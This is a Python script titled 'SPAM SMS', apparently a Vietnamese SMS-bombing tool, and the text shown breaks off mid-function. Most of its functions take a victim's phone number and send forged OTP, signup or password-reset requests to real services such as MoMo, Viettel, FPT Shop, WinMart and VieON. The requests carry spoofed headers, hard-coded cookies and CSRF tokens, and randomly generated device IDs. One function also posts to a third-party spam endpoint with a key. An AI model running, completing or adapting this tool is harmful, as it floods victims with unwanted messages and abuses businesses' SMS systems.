[file name]: spmsms.py
[file content begin]
import os
import requests
import time
import re
import json
import uuid
import random
import sys
import socket
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode
import string

class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = "\033[1m"
    TAU = "\U0001f680"

ban = """
███████╗██████╗  █████╗ ███╗   ███╗    ███████╗███╗   ███╗███████╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║    ██╔════╝████╗ ████║██╔════╝
███████╗██████╔╝███████║██╔████╔██║    ███████╗██╔████╔██║███████╗
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ╚════██║██║╚██╔╝██║╚════██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ███████║██║ ╚═╝ ██║███████║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚═╝     ╚═╝╚══════╝
                                                                   """

def banner():
    os.system("cls" if os.name == 'nt' else "clear")
    for h in ban:
        sys.stdout.write(h)
        sys.stdout.flush()
        time.sleep(0.0003)

def generateRandomString(length, chars=None):
    if chars is None:
        chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.choices(chars, k=length))

def getimei():
    return generateRandomString(8, '0123456789abcdef') + '-' + generateRandomString(4, '0123456789abcdef') + '-' + generateRandomString(4, '0123456789abcdef') + '-' + generateRandomString(4, '0123456789abcdef') + '-' + generateRandomString(12, '0123456789abcdef')

def get_SECUREID():
    return generateRandomString(17, '0123456789abcdef')

def get_TOKEN():
    return generateRandomString(22) + ':' + generateRandomString(9) + '-' + generateRandomString(20) + '-' + generateRandomString(12) + '-' + generateRandomString(7) + '-' + generateRandomString(7) + '-' + generateRandomString(53) + '-' + generateRandomString(9) + '_' + generateRandomString(11) + '-' + generateRandomString(4)

def safe_request(func, *args, **kwargs):
    try:
        response = func(*args, **kwargs)
        print(f"{style.GREEN}✓ Thành công: {func.__name__}{style.RESET}")
        return response
    except Exception as e:
        print(f"{style.RED}✗ Thất bại: {func.__name__} - {str(e)}{style.RESET}")
        return None

def vayvnd(sdt):
    data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt", sdt)
    head = {
        "Host": "api.vayvnd.vn",
        "accept": "application/json",
        "accept-language": "vi-VN",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "site-id": "3",
        "content-type": "application/json; charset=utf-8",
        "origin": "https://vayvnd.vn",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vayvnd.vn/",
        "accept-encoding": "gzip, deflate, br",
    }
    return safe_request(requests.post, "https://api.vayvnd.vn/v2/users", data=data, headers=head, timeout=10)

def tamo(sdt):
    data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt", sdt)
    head = {
        "Host": "api.tamo.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.tamo.vn",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.tamo.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    return safe_request(requests.post, "https://api.tamo.vn/web/public/client/phone/sms-code-ts", data=data, headers=head, timeout=10)

def meta(sdt):
    data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt", sdt)
    head = {
        "Host": "meta.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://meta.vn",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://meta.vn/account/register",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    return safe_request(requests.post, "https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1", data=data, headers=head, timeout=10)

def kiot(sdt):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
    }
    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'phone': '+84'+sdt[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': sdt,
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': sdt,
    }
    return safe_request(requests.post, 'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php', cookies=cookies, headers=headers, data=data, timeout=10)

def fpt(sdt):
    headers = {
        "Host": "fptshop.com.vn",
        "content-length": "16",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Linux\"",
        "origin": "https://fptshop.com.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://fptshop.com.vn/",
        "accept-encoding": "gzip, deflate, br"
    }
    return safe_request(requests.post, "https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers=headers, data={"phone": sdt}, timeout=10)

def alfrescos(sdt):
    data = '{"phoneNumber":"sdt","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("sdt", sdt)
    head = {
        "Host": "api.alfrescos.com.vn",
        "accept": "application/json, text/plain, */*",
        "brandcode": "ALFRESCOS",
        "devicecode": "web",
        "accept-language": "vi-VN",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://alfrescos.com.vn",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://alfrescos.com.vn/",
        "accept-encoding": "gzip, deflate, br",
    }
    return safe_request(requests.post, "https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN", data=data, headers=head, timeout=10)

def poyeye(sdt):
    data = '{"phone":"sdt","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'.replace("sdt", sdt)
    head = {
        "Host": "api.popeyes.vn",
        "accept": "application/json",
        "x-client": "WebApp",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/json",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://popeyes.vn/",
        "accept-encoding": "gzip, deflate, br",
    }
    return safe_request(requests.post, "https://api.popeyes.vn/api/v1/register", data=data, headers=head, timeout=10)

def vieon(sdt):
    data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
    head = {
        "Host": "api.vieon.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vieon.vn/",
        "accept-encoding": "gzip, deflate, br",
    }
    return safe_request(requests.post, "https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021", data=data, headers=head, timeout=10)

def tv360(sdt):
    head = {
        "Host": "m.tv360.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/json",
    }
    data = '{"msisdn":"sdt"}'.replace("sdt", sdt)
    return safe_request(requests.post, "https://m.tv360.vn/public/v1/auth/get-otp-login", data=data, headers=head, timeout=10)

def winmart(sdt):
    head = {
        "Host": "api-crownx.winmart.vn",
        "accept": "application/json",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://winmart.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    return safe_request(requests.get, f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}", headers=head, timeout=10)

def fptplay(sdt):
    headers = {
        "Host": "api.fptplay.net",
        "content-length": "89",
        "sec-ch-ua": "\"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://fptplay.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://fptplay.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = json.dumps({"phone": sdt,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    return safe_request(requests.post, "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=Eim9hpobCZPoIoVVokkIDA&e=1681802671&device=Chrome(version%253A112.0.0.0)&drm=1", data=data, headers=headers, timeout=10)

def funring(sdt):
    data ='{"username": "sdt"}'.replace("sdt", sdt)
    head = {
        "Host": "funring.vn",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "X-Requested-With": "mark.via.gp",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    return safe_request(requests.post, "http://funring.vn/api/v1.0.1/jersey/user/getotp", data=data, headers=head, timeout=10)

def apispam(sdt):
    cookies = {
        '_ga': 'GA1.1.1928856259.1691039310',
        'serverChoice': 'Server-IPv1',
        '_ga_Y4RF4MF664': 'GS1.1.1691039309.1.1.1691039359.0.0.0',
    }
    headers = {
        'authority': 'crowstore.online',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://crowstore.online',
        'referer': 'https://crowstore.online/sms.php',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    }
    data = {
        'sodienthoai': sdt,
        'ten_server': 'Server-IPv1',
        'key': 'freekey307',
    }
    return safe_request(requests.post, 'https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data, timeout=10)

def vietid(sdt):
    try:
        csrfget = requests.get("https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", timeout=10)
        csrf = csrfget.text.split('name="csrf-token" value="')[1].split('"')[0]
        headers = {
            "Host": "oauth.vietid.net",
            "content-length": "41",
            "cache-control": "max-age=0",
            "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "upgrade-insecure-requests": "1",
            "origin": "https://oauth.vietid.net",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "referer": "https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        }
        payload = {"csrf-token": csrf,"account": sdt}
        return safe_request(requests.post, "https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=payload, headers=headers, timeout=10)
    except Exception as e:
        return None

def dkvt(sdt):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {'msisdn': sdt}
    return safe_request(requests.post, 'https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data, timeout=10)

def viettel(sdt):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {'phone': sdt, 'type': ''}
    return safe_request(requests.post, 'https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data, timeout=10)

def momo(sdt):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user": sdt,
        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": sdt,
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user": sdt,
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": sdt,
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id": "undefined",
        "sessionkey": "",
        "user_phone": "undefined",
        "authorization": "Bearer undefined",
        "msgtype": "SEND_OTP_MSG",
        "Host": "api.momo.vn",
        "User-Agent": "okhttp/3.14.17",
        "app_version": "31062",
        "app_code": "3.1.6",
        "device_os": "ANDROID",
        "Content-Type": "application/json"
    }
    data = json.dumps(data)
    data1 = json.dumps(data1)
    safe_request(requests.post, "https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG", headers=h, data=data1, timeout=10)
    return safe_request(requests.post, "https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG", headers=h, data=data, timeout=10)

def call1(sdt):
    return safe_request(requests.post, "https://api.vayvnd.vn/v1/users/password-reset", headers={
        "Host": "api.vayvnd.vn",
        "content-length": "22",
        "accept": "application/json",
        "content-type": "application/json",
        "accept-language": "vi",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vayvnd.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vayvnd.vn/",
        "accept-encoding": "gzip, deflate, br"
    }, data=json.dumps({"login": sdt}), timeout=10)

def call2(sdt):
    return safe_request(requests.post, "https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={
        "Host": "api.tamo.vn",
        "content-length": "39",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Linux\"",
        "origin": "https://www.tamo.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.tamo.vn/",
        "accept-encoding": "gzip, deflate, br"
    }, json=({"mobilePhone":{"number": sdt}}), timeout=10)

def call3(sdt):
    return safe_request(requests.post, "https://api.senmo.vn/api/user/send-one-time-password", headers={
        "Host": "api.senmo.vn",
        "content-length": "23",
        "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
        "content-type": "application/json",
        "accept-language": "vi",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "accept": "*/*",
        "origin": "https://senmo.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://senmo.vn/user/login",
        "accept-encoding": "gzip, deflate, br"
    }, data=json.dumps({"phone": "84"+sdt[1:]}), timeout=10)

def call4(sdt):
    headers = {
        "Host": "atmonline.com.vn",
        "content-length": "46",
        "sec-ch-ua": "\"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://atmonline.com.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://atmonline.com.vn/portal-new/login?mobilePhone=0777531398&requestedAmount=4000000&requestedTerm=4&locale=vn&designType=NEW",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "cookie": "_ga_181P8FC3KD=GS1.1.1681739176.1.1.1681739193.43.0.0"
    }
    data = json.dumps({"mobilePhone": sdt,"source":"ONLINE"})
    return safe_request(requests.post, "https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode", data=data, headers=headers, timeout=10)

def call5(sdt):
    headers = {
        "Host": "api.thantaioi.vn",
        "content-length": "23",
        "sec-ch-ua": "\"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "content-type": "application/json",
        "accept-language": "vi",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "accept": "*/*",
        "origin": "https://thantaioi.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://thantaioi.vn/user/login",
        "accept-encoding": "gzip, deflate, br",
        "cookie": "_ga_LBS7YCVKY6=GS1.1.1681807570.2.1.1681807596.34.0.0"
    }
